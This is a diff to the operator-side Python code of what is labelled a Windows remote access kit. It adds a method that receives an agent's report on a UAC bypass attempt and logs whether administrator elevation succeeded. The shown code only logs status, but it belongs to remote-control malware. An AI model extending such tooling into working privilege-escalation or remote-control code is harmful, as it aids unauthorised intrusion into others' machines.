@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.22
+# Build:  1.0.23
 # -------------------------------------------------------------
 import socket
 
@@ -90,3 +90,11 @@ class ReceiverSocket:
             taskkill_output = 'ERROR: The process could not be terminated.' #Set to error message on server side
         ConsoleWindow().log_to_console(taskkill_output)                     #Log to console
         LoggingUtilitys().write_data_to_file(DSFilePath().job_file,'null')  #Create a job file to break the while loop
+
+    #Function will receive the status of a UAC bypass to admininstrator level
+    def recv_uac_elev_stat(self,encryption_key):
+        output = self.recv_string(encryption_key)       #Capture client output
+        if output == 'good':                            #If good, log positive output
+            ConsoleWindow().log_to_console('Agent successfully executed UAC elevation attempt.')
+        elif output == 'bad':                           #If bad, log negative output
+            ConsoleWindow().log_to_console('Agent failed to elevate permissions.')
